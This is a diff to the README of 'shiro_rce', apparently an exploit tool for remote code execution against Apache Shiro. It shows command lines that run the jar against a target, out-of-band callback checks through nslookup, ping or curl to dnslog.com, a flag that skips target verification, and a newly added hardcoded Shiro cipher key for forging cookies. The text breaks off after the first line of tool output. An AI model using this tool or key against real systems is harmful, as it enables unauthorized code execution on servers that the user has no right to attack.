@@ -1,9 +1,10 @@
 # shiro_rce
 
 ```
-java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/  nslookup/ping1/ping2/curl nocheck
+java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/  nslookup/ping1/ping2/curl nocheck key=kPH+bIxk5D2deZiIxcaaaA==
 nslookup/ping1/ping2/curl--> use nslookup dnslog.com check./use ping -c 1 dnslog.com check(default)./use ping -n 1 dnslog.com check./use curl dnslog.com check.
 nocheck --> skip check target is shiro or not.
+key= --> set a shiro key.
 
 [admin@ shiro]java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/          
 [-] target: https://xx.xx.xx.xx/
